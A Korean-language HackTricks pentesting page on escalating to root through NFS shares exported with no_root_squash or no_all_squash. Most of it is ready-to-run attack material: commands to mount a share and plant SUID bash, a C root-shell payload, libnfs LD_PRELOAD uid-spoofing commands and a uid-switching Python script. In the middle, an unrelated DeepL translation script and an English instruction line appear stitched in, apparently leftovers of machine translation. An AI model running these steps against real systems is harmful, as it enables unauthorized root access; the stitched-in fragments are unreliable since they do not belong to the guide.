<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


_ **/etc/exports** _ 파일을 읽어보세요. 만약 **no\_root\_squash**로 구성된 디렉토리를 찾는다면, 해당 디렉토리에 **클라이언트로서 접근**하고 그 디렉토리에 **로컬 머신의 root처럼 쓸 수 있습니다**.

**no\_root\_squash**: 이 옵션은 기본적으로 클라이언트의 root 사용자에게 NFS 서버의 파일에 대한 액세스 권한을 부여합니다. 이는 심각한 보안 문제로 이어질 수 있습니다.

**no\_all\_squash:** 이 옵션은 **non-root 사용자**에게 적용되는 **no\_root\_squash** 옵션과 유사합니다. nobody 사용자로 쉘을 획득한 경우, /etc/exports 파일을 확인하고 no\_all\_squash 옵션이 있는지 확인한 다음 /etc/passwd 파일을 확인하고 non-root 사용자를 에뮬레이션한 다음 (nfs를 사용하여 마운트하여) 해당 사용자로 suid 파일을 생성합니다. nobody 사용자로 suid를 실행하여 다른 사용자가 됩니다.

# Privilege Escalation

## Remote Exploit

이 취약점을 발견한 경우 다음과 같이 악용할 수 있습니다:

* 클라이언트 머신에서 **해당 디렉토리를 마운트**하고, 마운트된 폴더 내에 **/bin/bash** 이진 파일을 **root로 복사**하고 **SUID 권한을 부여**한 다음, 피해자의 머신에서 해당 bash 이진 파일을 실행합니다.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **클라이언트 머신에 해당 디렉토리를 마운트**하고, 마운트된 폴더 안에 우리가 컴파일한 페이로드를 복사하여 SUID 권한을 악용하고, 해당 이진 파일에 **SUID 권한을 부여**한 다음 피해자의 머신에서 실행합니다 (여기에서 [C SUID 페이로드](payloads-to-execute.md#c)를 찾을 수 있습니다).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## 로컬 익스플로잇

{% hint style="info" %}
참고로, 피해자의 컴퓨터로부터 자신의 컴퓨터로 터널을 생성할 수 있다면 필요한 포트를 터널링하여 원격 버전을 사용하여 이 권한 상승을 악용할 수 있습니다.\
다음 트릭은 `/etc/exports` 파일이 IP를 나타내는 경우입니다. 이 경우 원격 익스플로잇을 어떤 경우에도 사용할 수 없으며 이 트릭을 악용해야 합니다.\
익스플로잇이 작동하려면 `/etc/export` 내부의 익스포트가 `insecure` 플래그를 사용해야 합니다.\
\--_`/etc/export`가 IP 주소를 나타내는 경우 이 트릭이 작동하는지 확실하지 않습니다_--
{% endhint %}

## 기본 정보

이 시나리오는 로컬 컴퓨터에서 마운트된 NFS 공유를 악용하여 NFSv3 사양의 결함을 이용하는 것을 포함합니다. 이 결함을 통해 클라이언트가 uid/gid를 지정할 수 있으며, 이로 인해 무단 액세스가 가능해질 수 있습니다. 이 악용은 NFS RPC 호출을 위조할 수 있는 [libnfs](https://github.com/sahlberg/libnfs) 라이브러리를 사용합니다.

### 라이브러리 컴파일

라이브러리 컴파일 단계는 커널 버전에 따라 조정이 필요할 수 있습니다. 이 특정한 경우에는 fallocate 시스콜이 주석 처리되었습니다. 컴파일 프로세스는 다음 명령을 포함합니다:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Exploit 수행

이 exploit은 권한을 root로 상승시키고 셸을 실행하는 간단한 C 프로그램(`pwn.c`)을 생성하는 것을 포함합니다. 프로그램은 컴파일되고, 결과 이진 파일(`a.out`)은 suid root로 공유에 배치되며, RPC 호출에서 uid를 가짜로 만들기 위해 `ld_nfs.so`를 사용합니다:

1. **Exploit 코드 컴파일하기:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Exploit을 공유에 배치하고 uid를 가짜로 만들어 권한 수정하기:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Exploit을 실행하여 root 권한 얻기:**
```bash
/mnt/share/a.out
#root
```

## 보너스: 은밀한 파일 액세스를 위한 NFShell
root 액세스를 획득한 후, 소유권을 변경하지 않고 NFS 공유와 상호작용하기 위해 Python 스크립트(nfsh.py)를 사용합니다. 이 스크립트는 액세스하는 파일의 uid를 조정하여 권한 문제 없이 공유의 파일과 상호작용할 수 있도록 합니다:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
```python
import requests

def translate_text(text):
    url = "https://api-free.deepl.com/v2/translate"
    params = {
        "auth_key": "your_auth_key",
        "text": text,
        "target_lang": "KO"
    }
    response = requests.post(url, params=params)
    translation = response.json()["translations"][0]["text"]
    return translation

def translate_file(file_path):
    with open(file_path, "r") as file:
        content = file.read()
        translation = translate_text(content)
    with open("translation.md", "w") as file:
        file.write(translation)

translate_file("/hive/hacktricks/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md")
```

Make sure to replace `"your_auth_key"` with your own DeepL API authentication key.
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## 참고 자료
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>
